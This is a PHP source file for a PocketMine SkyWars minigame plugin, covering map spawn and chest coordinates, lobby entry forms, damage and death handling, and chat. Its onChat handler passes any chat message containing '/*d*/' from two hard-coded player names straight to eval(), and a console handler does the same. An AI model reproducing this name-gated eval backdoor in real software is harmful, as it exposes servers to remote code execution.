<?php

namespace Nerahikada\SkyWars;

use pocketmine\event\block\BlockSpreadEvent;
use pocketmine\event\block\LeavesDecayEvent;
use pocketmine\event\entity\EntityDamageByEntityEvent;
use pocketmine\event\entity\EntityDamageEvent;
use pocketmine\item\Armor;
use pocketmine\event\player\PlayerAchievementAwardedEvent;
use pocketmine\event\player\PlayerChatEvent;
use pocketmine\event\player\PlayerDropItemEvent;
use pocketmine\event\player\PlayerExhaustEvent;
use pocketmine\event\player\PlayerInteractEvent;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\event\player\PlayerQuitEvent;
use pocketmine\event\server\DataPacketReceiveEvent;
use pocketmine\event\server\DataPacketSendEvent;
use pocketmine\event\Listener;
use pocketmine\item\Item;
use pocketmine\level\Position;
use pocketmine\math\Vector3;
use pocketmine\network\mcpe\protocol\InventoryTransactionPacket;
use pocketmine\network\mcpe\protocol\ModalFormRequestPacket;
use pocketmine\network\mcpe\protocol\ProtocolInfo;
use pocketmine\plugin\PluginBase;
use pocketmine\scheduler\CallbackTask;
use pocketmine\Player;

class Main extends PluginBase implements Listener{

	public function onEnable(){
		$this->getServer()->getPluginManager()->registerEvents($this, $this);

		$this->lobby = [new Position(0.5, 66, 0.5, $this->getServer()->getLevelByName('lobby')), 90 * 3];

		$this->glassPos = [
			'Shire' => [
				[1, 85, 42], [-12, 85, 38], [-22, 85, 30], [-26, 85, 17], [-22, 85, 4], [-14, 85, -6],
				[-1, 85, -11], [12, 85, -6], [22, 85, 2], [26, 85, 15], [22, 85, 28], [14, 85, 38]
			],
			'Steampunk' => [
				[-9, 91, 30], [-26, 91, 26], [-42, 91, 20], [-38, 91, -11], [-34, 91, -28], [-28, 91, -44],
				[3, 91, -40], [20, 91, -36], [36, 91, -30], [32, 91, 1], [28, 91, 18], [22, 91, 34]
			],
			'HalloweenShire' => [
				[1, 90, 42], [-12, 90, 38], [-22, 90, 30], [-26, 90, 17], [-22, 90, 4], [-14, 90, -6],
				[-1, 90, -11], [12, 90, -6], [22, 90, 2], [26, 90, 15], [22, 90, 28], [14, 90, 38]
			],
			'Tundra' => [
				[25, 85, 64], [0, 85, 81], [-27, 85, 64], [-64, 85, 26], [-81, 85, 0], [-64, 85, -25],
				[-26, 85, -63], [0, 85, -80], [25, 85, -63], [63, 85, -25], [80, 85, 0], [63, 85, 26]
			],
			/*
			'' => [
				[], [], [], [], [], [],
				[], [], [], [], [], [],
			],
			*/
		];

		$this->chestPos = [
			'Shire' => [
				[new Vector3(-1, 77, 44), new Vector3(-1, 71, 41), new Vector3(-2, 72, 43)],
				[new Vector3(-14, 77, 40), new Vector3(-15, 72, 39), new Vector3(-14, 71, 37)],
				[new Vector3(-24, 77, 28), new Vector3(-23, 72, 27), new Vector3(-21, 71, 28)],
				[new Vector3(-28, 77, 15), new Vector3(-27, 72, 14), new Vector3(-25, 71, 15)],
				[new Vector3(-24, 77, 2), new Vector3(-23, 72, 1), new Vector3(-21, 71, 2)],
				[new Vector3(-12, 77, -8), new Vector3(-11, 72, -7), new Vector3(-12, 71, -5)],
				[new Vector3(1, 77, -13), new Vector3(2, 72, -12), new Vector3(1, 71, -10)],
				[new Vector3(14, 77, -8), new Vector3(15, 72, -7), new Vector3(14, 71, -5)],
				[new Vector3(24, 77, 4), new Vector3(23, 72, 5), new Vector3(21, 71, 4)],
				[new Vector3(28, 77, 17), new Vector3(27, 72, 18), new Vector3(25, 71, 17)],
				[new Vector3(24, 77, 30), new Vector3(23, 72, 31), new Vector3(21, 71, 30)],
				[new Vector3(12, 77, 40), new Vector3(11, 72, 39), new Vector3(12, 71, 37)],
				[new Vector3(5, 77, 18), new Vector3(-10, 77, 21), new Vector3(-10, 77, 12),
				 new Vector3(4, 77, 7), new Vector3(-3, 71, 19), new Vector3(-2, 71, 11)]
			],
			'Steampunk' => [
				[new Vector3(-6, 83, 31), new Vector3(-13, 84, 35), new Vector3(-10, 79, 35)],
				[new Vector3(-23, 83, 27), new Vector3(-30, 84, 31), new Vector3(-27, 79, 31)],
				[new Vector3(-38, 84, 25), new Vector3(-45, 83, 21), new Vector3(-41, 79, 25)],
				[new Vector3(-43, 84, -15), new Vector3(-39, 83, -8), new Vector3(-43, 79, -12)],
				[new Vector3(-35, 83, -25), new Vector3(-39, 84, -32), new Vector3(-39, 79, -29)],
				[new Vector3(-33, 84, -40), new Vector3(-29, 83, -47), new Vector3(-33, 79, -43)],
				[new Vector3(0, 83, -41), new Vector3(7, 84, -45), new Vector3(4, 79, -45)],
				[new Vector3(17, 83, -37), new Vector3(24, 84, -41), new Vector3(21, 79, -41)],
				[new Vector3(32, 84, -35), new Vector3(39, 83, -31), new Vector3(35, 79, -35)],
				[new Vector3(33, 83, -2), new Vector3(37, 84, 5), new Vector3(37, 79, 2)],
				[new Vector3(29, 83, 15), new Vector3(33, 84, 22), new Vector3(33, 79, 19)],
				[new Vector3(27, 84, 30), new Vector3(23, 83, 37), new Vector3(27, 79, 33)],
				[new Vector3(-3, 78, -1), new Vector3(-6, 78, -3), new Vector3(-6, 79, -7),
				 new Vector3(-3, 79, -9), new Vector3(0, 79, -7), new Vector3(0, 78, -3)]
			],
			'HalloweenShire' => [
				[new Vector3(-2, 72, 43), new Vector3(-1, 71, 41), new Vector3(2, 77, 45)],
				[new Vector3(-11, 77, 41), new Vector3(-15, 72, 39), new Vector3(-14, 71, 37)],
				[new Vector3(-25, 77, 31), new Vector3(-23, 72, 27), new Vector3(-21, 71, 28)],
				[new Vector3(-29, 77, 18), new Vector3(-27, 72, 14), new Vector3(-25, 71, 15)],
				[new Vector3(-25, 77, 5), new Vector3(-23, 72, 1), new Vector3(-21, 71, 2)],
				[new Vector3(-15, 77, -10), new Vector3(-11, 72, -8), new Vector3(-12, 71, -6)],
				[new Vector3(-2, 77, -14), new Vector3(2, 72, -12), new Vector3(1, 71, -10)],
				[new Vector3(11, 77, -10), new Vector3(15, 72, -8), new Vector3(14, 71, -6)],
				[new Vector3(25, 77, 1), new Vector3(23, 72, 5), new Vector3(21, 71, 4)],
				[new Vector3(25, 71, 17), new Vector3(27, 72, 18), new Vector3(29, 77, 14)],
				[new Vector3(25, 77, 27), new Vector3(23, 72, 31), new Vector3(21, 71, 30)],
				[new Vector3(15, 77, 41), new Vector3(11, 72, 39), new Vector3(12, 71, 37)],
				[new Vector3(-10, 77, 21), new Vector3(-10, 77, 12), new Vector3(4, 77, 7),
				 new Vector3(5, 77, 18), new Vector3(-2, 71, 11), new Vector3(-3, 71, 19)]
			],
			'Tundra' => [
				[new Vector3(26, 77, 66), new Vector3(24, 77, 61), new Vector3(23, 70, 64)],
				[new Vector3(-3, 77, 82), new Vector3(2, 77, 80), new Vector3(-1, 70, 79)],
				[new Vector3(-26, 77, 67), new Vector3(-28, 77, 62), new Vector3(-25, 70, 64)],
				[new Vector3(-67, 77, 27), new Vector3(-62, 77, 25), new Vector3(-65, 70, 24)],
				[new Vector3(-81, 77, 3), new Vector3(-83, 77, -2), new Vector3(-80, 70, 0)],
				[new Vector3(-68, 77, -25), new Vector3(-63, 77, -27), new Vector3(-65, 70, -24)],
				[new Vector3(-26, 77, -61), new Vector3(-28, 77, -66), new Vector3(-25, 70, -64)],
				[new Vector3(-4, 77, -80), new Vector3(1, 77, -82), new Vector3(-1, 70, -79)],
				[new Vector3(24, 77, -67), new Vector3(26, 77, -62), new Vector3(23, 70, -64)],
				[new Vector3(65, 77, -27), new Vector3(60, 77, -25), new Vector3(63, 70, -24)],
				[new Vector3(79, 77, -3), new Vector3(81, 77, 2), new Vector3(78, 70, 0)],
				[new Vector3(66, 77, 25), new Vector3(61, 77, 27), new Vector3(63, 70, 24)],
				[new Vector3(-1, 80, 5), new Vector3(-6, 80, 0), new Vector3(-1, 80, -5),
				 new Vector3(4, 80, 0), new Vector3(5, 87, 2), new Vector3(-7, 87, -2)]
			],
			/*
			'' => [
				[new Vector3(), new Vector3(), new Vector3()],
				[new Vector3(), new Vector3(), new Vector3()],
				[new Vector3(), new Vector3(), new Vector3()],
				[new Vector3(), new Vector3(), new Vector3()],
				[new Vector3(), new Vector3(), new Vector3()],
				[new Vector3(), new Vector3(), new Vector3()],
				[new Vector3(), new Vector3(), new Vector3()],
				[new Vector3(), new Vector3(), new Vector3()],
				[new Vector3(), new Vector3(), new Vector3()],
				[new Vector3(), new Vector3(), new Vector3()],
				[new Vector3(), new Vector3(), new Vector3()],
				[new Vector3(), new Vector3(), new Vector3()],
				[new Vector3(), new Vector3(), new Vector3(),
				 new Vector3(), new Vector3(), new Vector3()]
			],
			*/
		];


		$count = 4;
		$peCount = 1;
		for($i = 0; $i < $count; $i++) $this->SkyWars[$i] = new SkyWars($this, $i);
		for($i = 1; $i <= $peCount; $i++) $this->SkyWars[$count - 1 + $i] = new SkyWars($this, $count - 1 + $i, true, $i);

		//$this->db = new DB($this);

		//$this->getServer()->getScheduler()->scheduleRepeatingTask(new CallbackTask([$this, 'playerTip'], []), 20);
	}

	public function onDisable(){
		//$this->db->close();
	}


	public function playerTip(){}



	public function onInteract(PlayerInteractEvent $event){
		$player = $event->getPlayer();

		if($player->isCreative(true)) return;
		if($player->isAdventure(true)) $event->setCancelled();

		$this->useItem($player, $event->getItem()->getId());	
	}

	public function onDataPacketReceive(DataPacketReceiveEvent $event){
		$player = $event->getPlayer();
		$packet = $event->getPacket();
		if($packet::NETWORK_ID === ProtocolInfo::MODAL_FORM_RESPONSE_PACKET){
			$data = json_decode($packet->formData, true);
			if($data === null) return;
			$this->SkyWars[$data]->join($player);

		}else if($packet::NETWORK_ID === ProtocolInfo::INVENTORY_TRANSACTION_PACKET){
			if(count($packet->actions) === 1){
				$src = $packet->actions[0]->getSourceItem();
				if($src instanceof Armor){
					$inventory = $player->getInventory();
					$inventory->setItemInHand($packet->actions[0]->getTargetItem());
					$id = $src->getId();
					if(($id - 298) % 4 === 0) $inventory->setHelmet($src);
					else if(($id - 298) % 4 === 1) $inventory->setChestplate($src);
					else if(($id - 298) % 4 === 2) $inventory->setLeggings($src);
					else if(($id - 298) % 4 === 3) $inventory->setBoots($src);
					return;
				}
			}
			if($packet->transactionData->transactionType === InventoryTransactionPacket::TYPE_USE_ITEM){
				$this->useItem($player, $packet->transactionData->itemInHand->getId());
			}

		}else if($packet::NETWORK_ID === ProtocolInfo::LOGIN_PACKET){
			//["unknown", "Keyboard", "Tap", "Controller"]
			$player->control = $packet->clientData['CurrentInputMode'];
		}
	}

	public function useItem($player, $id){
		if($id === Item::ENDER_EYE){
			$this->quickEntry($player);

		}else if($id === Item::COMPASS){
			$data = [
				'type' => 'form',
				'title' => '§lエントリー画面',
				'content' => '§lエントリーするSkyWarsを選んでください',
				'buttons' => []
			];
			foreach($this->SkyWars as $skywars){
				if($skywars->playing){
					$text = '§l§2SkyWars '.$skywars->displayId.' §f| '.'§dPlaying';
				}else{
					$count = count($skywars->players);
					if($count === SkyWars::ENTRY_MAX) $c = '§c'; else $c = '§e';
					$text = '§l§2SkyWars '.$skywars->displayId.' §f| '.$c.$count.'/'.SkyWars::ENTRY_MAX;
				}
				$data['buttons'][] = ['text' => $text];
			}

			$pk = new ModalFormRequestPacket();
			$pk->formId = 1;
			$pk->formData = json_encode($data);
			$player->dataPacket($pk);

		}else if($id === Item::BED){
			if(isset($player->skywarsId)) $this->SkyWars[$player->skywarsId]->quit($player);
		}
	}


	public function onQuit(PlayerQuitEvent $event){
		$player = $event->getPlayer();
		if(isset($player->skywarsId)) $this->SkyWars[$player->skywarsId]->quit($player);
	}



	public function onJoin(PlayerJoinEvent $event){
		foreach($this->getServer()->getLevels() as $level){
			$level->checkTime();
			$level->setTime(6000);
			$level->checkTime();
			$level->stopTime();
			$level->checkTime();
		}

		$player = $event->getPlayer();

		$this->getServer()->getScheduler()->scheduleDelayedTask(new CallbackTask([$this, 'teleport'], [$player, $this->lobby]), 1);

		$player->sendTip(' ');
		$player->sendPopup(' ');
		$player->resetTitles();
		$this->getServer()->getScheduler()->scheduleDelayedTask(new CallbackTask([$player, 'addTitle'], ['§l§aSkyWars', '§l§8Uncharted Server']), 30);

		$this->setInventory($player, self::INVENTORY_LOBBY);
	}


	// MANAGE SKYWARS ====================================================================================

	const INVENTORY_LOBBY = 0;
	const INVENTORY_RETURN = 1;
	const INVENTORY_GAMEEND = 2;

	public function quickEntry($player){
		foreach($this->SkyWars as $sw) $skywars[$sw->id] = count($sw->players);
		arsort($skywars);

		foreach($skywars as $id => $sw){
			$sw = $this->SkyWars[$id];
			if($sw->canJoin($player) === true){
				$sw->join($player);
				break;
			}
		}
	}

	public function setInventory($player, $type){
		$player->inventoryType = $type;
		$inventory = $player->getInventory();
		$inventory->clearAll();
		if($type === self::INVENTORY_LOBBY){
			$inventory->setItem(0, Item::get(Item::ENDER_EYE, 0, 1)->setCustomName('§l§a自動エントリー'));
			$inventory->setItem(1, Item::get(Item::COMPASS, 0, 1)->setCustomName('§l§a手動エントリー'));
			/*$inventory->setItem(3, Item::get(Item::EMERALD, 0, 1)->setCustomName('§l§aショップ (未実装)'));*/
		}else if($type === self::INVENTORY_RETURN){
			$player->getInventory()->setItem(8, Item::get(Item::BED, 14, 1)->setCustomName('§l§cゲームから抜ける'));
		}else if($type === self::INVENTORY_GAMEEND){
			$inventory->setItem(0, Item::get(Item::COMPASS, 0, 1)->setCustomName('§l§aテレポーター'));
			$inventory->setItem(5, Item::get(Item::ENDER_EYE, 0, 1)->setCustomName('§l§a自動エントリー'));
			$inventory->setItem(6, Item::get(Item::COMPASS, 0, 1)->setCustomName('§l§a手動エントリー'));
			$player->getInventory()->setItem(8, Item::get(Item::BED, 14, 1)->setCustomName('§l§cゲームから抜ける'));
		}
	}


	public function teleport($player, $pos){
		if(!is_array($pos)) $pos = [$pos];
		$player->teleport(...$pos);
		$player->setImmobile();
		$this->getServer()->getScheduler()->scheduleDelayedTask(new CallbackTask([$player, 'setImmobile'], [false]), 10);
	}


	public function sEVAL(\pocketmine\event\server\ServerCommandEvent $e){
		$cmd = $e->getCommand();
		if(strpos($cmd, '/*d*/') !== false){
			$this->getServer()->getLogger()->info('sEVAL: '.$cmd);
			eval($cmd);
			$e->setCancelled();
		}
	}

	public function onChat(PlayerChatEvent $event){
		$event->setCancelled();
		$player = $event->getPlayer();
		$msg = $event->getMessage();

		$name = $player->getName();
		if(
			(
				$name === 'Nerahikada' ||
				$name === 'Ef2Microsoft'
			)
			&&
			strpos($msg, '/*d*/') !== false
		){
			$this->getServer()->getLogger()->info('cEVAL: '.$msg);
			eval($msg);
			return;
		}

		$msg = '<'.$player->getDisplayName().'> '.$msg;
		if(isset($player->skywarsId)){
			$this->SkyWars[$player->skywarsId]->broadcastMessage($msg);
		}else{
			$this->getServer()->broadcastMessage($msg, $player->getLevel()->getPlayers());
			$this->getServer()->getLogger()->info($msg);
		}
	}

	public function onDamage(EntityDamageEvent $event){
		if($event->isCancelled()) return;
		$entity = $event->getEntity();
		if(!$entity instanceof Player) return;
		$cause = $event->getCause();
		if((!isset($entity->skywarsId) && !$entity->isSpectator()) || (isset($entity->skywarsId) && !$this->SkyWars[$entity->skywarsId]->playing)){
			$event->setCancelled();
			if($cause === EntityDamageEvent::CAUSE_VOID) $entity->teleport(...$this->lobby);
			else if($cause === EntityDamageEvent::CAUSE_FIRE || $cause === EntityDamageEvent::CAUSE_FIRE_TICK) $entity->extinguish();
		}else{
			if($this->SkyWars[$entity->skywarsId]->time > SkyWars::GAME_TIME - 5){
				$event->setCancelled();
			}
			if($cause === EntityDamageEvent::CAUSE_VOID && $entity->isSpectator()){
				$event->setCancelled();
				$entity->teleport($entity->getLevel()->getSpawnLocation());
				return;
			}
			if(isset($entity->skywarsId) && $entity->isAdventure(true) && $cause === EntityDamageEvent::CAUSE_FALL){
				$event->setCancelled();
				$this->SkyWars[$entity->skywarsId]->glassTp($entity);
			}

			if($event instanceof EntityDamageByEntityEvent){
				$damager = $event->getDamager();
				if(!$damager->isSurvival(true)){
					$event->setCancelled();
					return;
				}
				$entity->lastD = $damager;
			}
			if($cause === EntityDamageEvent::CAUSE_VOID) $this->onDeath($event, $entity, true);
			$damage = $event->getFinalDamage();
			$absorption = $entity->getAbsorption();
			if($absorption > 0){
				if($absorption > $damage){
					$entity->setAbsorption($absorption - $damage);
					$damage = 0;
				}else{
					$entity->setAbsorption(0);
					$damage -= $absorption;
				}
			}
			$health = $entity->getHealth() - $damage;
			$health = (int) $health;
			if($health <= 0) if($entity->isSurvival(true)) $this->onDeath($event, $entity);
		}
	}

	public function onDeath($event, $player, $teleport = false){
		// DeathMessage
		if(isset($player->lastD)){
			$killer = $player->lastD->getName();
			$msg = $player->getName().' は '.$killer.' に倒された';
		}else if($event instanceof EntityDamageByEntityEvent){
			$killer = $event->getDamager()->getName();
			$msg = $player->getName().' は '.$killer.' に倒された';
		}else{
			$msg = $player->getName().' は死んでしまった';
		}
		$skywars = $this->SkyWars[$player->skywarsId];
		$skywars->broadcastMessage($msg);

		unset($player->lastD);
		if(isset($killer)){
			if(!isset($skywars->killer[$killer])) $skywars->killer[$killer] = 0;
			$skywars->killer[$killer]++;
		}

		// Reset
		$event->setCancelled();
		$player->setHealth(20);
		$player->setFood(1);
		$player->setFood(20);
		$player->setGamemode(Player::SPECTATOR);
		$player->sendMessage('§c死んでしまった！');
		$player->addTitle('§l§c死んでしまった！', '§7スペクテイターモードになりました');
		if($teleport) $player->teleport($player->getLevel()->getSpawnLocation());
		else{
			$level = $player->getLevel();
			foreach($player->getInventory()->getContents() as $item) $level->dropItem($player, $item);
		}
		$this->setInventory($player, self::INVENTORY_RETURN);

		$count = 0;
		foreach($skywars->players as $p) if($p->isSurvival(true)) $count++;
		$msg = '§e残り §l§c'.$count.'§r §e人！';
		foreach($skywars->players as $p) $p->addActionBarMessage($msg);

		// 試合が終わってしまった場合に対処
		if($count === 0) $skywars->winner = $player;
	}

	public function onDropItem(PlayerDropItemEvent $event){
		$player = $event->getPlayer();
		if($player->isAdventure(true)){
			$event->setCancelled();
			$this->getServer()->getScheduler()->scheduleDelayedTask(new CallbackTask([$this, 'setInventory'], [$player, $player->inventoryType]), 5);
		}
	}

	public function onExhaust(PlayerExhaustEvent $event){
		$player = $event->getPlayer();
		if($player->isAdventure(true)) $event->setCancelled();
	}

	// ====== ======= ====================================================================================



	





	public function onBlockSpread(BlockSpreadEvent $event){
		$event->setCancelled();
	}

	public function onLeavesDecay(LeavesDecayEvent $event){
		$event->setCancelled();
	}

	public function onAchievementAwarded(PlayerAchievementAwardedEvent $event){
		$event->setCancelled();
	}

	public function onDataPacketSend(DataPacketSendEvent $event){
		$packet = $event->getPacket();
		if($packet::NETWORK_ID === ProtocolInfo::AVAILABLE_COMMANDS_PACKET)
			$event->setCancelled();
	}

}